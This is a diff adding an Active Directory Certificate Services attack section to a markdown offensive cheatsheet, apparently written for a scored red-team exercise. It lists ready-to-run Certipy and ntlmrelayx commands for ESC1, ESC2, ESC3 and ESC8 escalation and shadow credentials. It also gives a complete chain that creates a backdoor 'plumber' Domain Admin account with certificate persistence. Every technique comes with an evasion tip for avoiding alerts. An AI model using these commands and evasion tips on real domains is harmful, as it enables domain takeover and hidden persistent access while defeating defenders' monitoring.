@@ -350,4 +350,100 @@ Creating a user with Domain Admin rights is a high-value target for detection. T
 - **Command Line Obfuscation**: Use techniques from the [Command Obfuscation Cheatsheet](Command-Obfuscation-Cheatsheet.md) to hide suspicious parameters.
 - **Session Management**: Limit the number of concurrent sessions to avoid triggering threshold-based alerts.
 
+## 7. Active Directory Certificate Services (AD CS) Attacks
+
+Active Directory Certificate Services (AD CS) is often an overlooked attack vector that can provide stealthy paths to domain dominance. These attacks target misconfigured certificate templates, enrollment services, and other AD CS components.
+
+- **Certipy for AD CS Enumeration**: Identify vulnerable certificate templates and AD CS misconfigurations.
+  - **Tools**: `Certipy` (https://github.com/ly4k/Certipy)
+  - **Example (Enumerate AD CS Environment)**:
+    ```bash
+    # Find all certificate templates and their configurations
+    certipy find -u <username>@<domain> -p <password> -dc-ip <dc_ip> -output adcs_enum
+    
+    # Analyze the output for vulnerable templates
+    certipy find -vulnerable -stdout -json adcs_enum.json
+    ```
+  - **Evasion Tip**: AD CS enumeration typically generates minimal alerts as it uses standard LDAP queries. Use authenticated sessions with valid credentials.
+
+- **ESC1 Attack (User/Machine Template Misconfiguration)**: Exploit templates that allow user authentication and have dangerous settings.
+  - **Tools**: `Certipy`
+  - **Example (ESC1 Exploitation)**:
+    ```bash
+    # Request a certificate using a vulnerable template
+    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <vulnerable_template> -upn administrator@<domain>
+    
+    # Use the certificate for authentication
+    certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
+    ```
+  - **Evasion Tip**: Certificate requests are legitimate operations and often generate minimal alerts. The authentication using the certificate is also less likely to trigger alerts than traditional credential-based authentication.
+
+- **ESC2 Attack (SAN Attribute Misconfiguration)**: Exploit templates that allow specifying Subject Alternative Name (SAN).
+  - **Tools**: `Certipy`
+  - **Example (ESC2 Exploitation)**:
+    ```bash
+    # Request a certificate with SAN specifying a domain admin
+    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <vulnerable_template> -san administrator@<domain>
+    
+    # Use the certificate for authentication
+    certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
+    ```
+  - **Evasion Tip**: Carefully select the target account to minimize detection. Avoid targeting highly monitored accounts if possible.
+
+- **ESC3 Attack (Enrollment Agent Template)**: Abuse enrollment agent templates to request certificates on behalf of other users.
+  - **Tools**: `Certipy`
+  - **Example (ESC3 Exploitation)**:
+    ```bash
+    # Request an enrollment agent certificate
+    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <enrollment_agent_template>
+    
+    # Use the enrollment agent certificate to request a certificate for another user
+    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <user_template> -on-behalf-of <domain>\administrator -pfx <enrollment_agent.pfx>
+    ```
+  - **Evasion Tip**: This attack involves multiple steps, which can be spread out over time to avoid correlation alerts.
+
+- **ESC8 Attack (NTLM Relay to AD CS Web Enrollment)**: Relay NTLM authentication to the Certificate Authority Web Enrollment service.
+  - **Tools**: `Certipy`, `ntlmrelayx.py` (impacket)
+  - **Example (ESC8 Exploitation)**:
+    ```bash
+    # Start the relay server
+    ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp -smb2support --adcs
+    
+    # Trigger NTLM authentication from a target
+    certipy relay -ca <ca_server>
+    ```
+  - **Evasion Tip**: NTLM relay attacks can be detected by network monitoring. Consider using this technique only if other methods are not available.
+
+- **Shadow Credentials with Certipy**: Alternative to the Whisker tool mentioned earlier.
+  - **Tools**: `Certipy`
+  - **Example (Shadow Credentials Attack)**:
+    ```bash
+    # Add shadow credentials to a target account
+    certipy shadow auto -u <username>@<domain> -p <password> -account <target_account>
+    
+    # Authenticate using the shadow credentials
+    certipy auth -pfx <target_account>.pfx -dc-ip <dc_ip>
+    ```
+  - **Evasion Tip**: This technique modifies the msDS-KeyCredentialLink attribute, which may be monitored but is less obvious than direct password changes.
+
+- **Creating the 'plumber' User with Certificate-Based Authentication**:
+  - **Example (Complete Attack Chain)**:
+    ```bash
+    # 1. Enumerate AD CS
+    certipy find -u <username>@<domain> -p <password> -dc-ip <dc_ip>
+    
+    # 2. Exploit a vulnerable template to get DA credentials
+    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <vulnerable_template> -san administrator@<domain>
+    certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
+    
+    # 3. Create the plumber user with the obtained credentials
+    # Using PowerShell (via pass-the-hash or the obtained TGT)
+    New-ADUser -Name "plumber" -SamAccountName "plumber" -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Enabled $true
+    Add-ADGroupMember -Identity "Domain Admins" -Members "plumber"
+    
+    # 4. Optional: Create a certificate for the plumber user for persistent access
+    certipy req -u administrator@<domain> -hashes <NTLM_hash> -dc-ip <dc_ip> -ca <ca_name> -template User -upn plumber@<domain>
+    ```
+  - **Evasion Tip**: Certificate-based persistence is often less monitored than other persistence mechanisms. The certificate can be used for authentication even if the password is later changed.
+
 Always consult the [Alert Evasion Cheatsheet](Alert-Evasion-Cheatsheet.md) and [Scoring System Cheatsheet](Scoring-System-Cheatsheet.md).
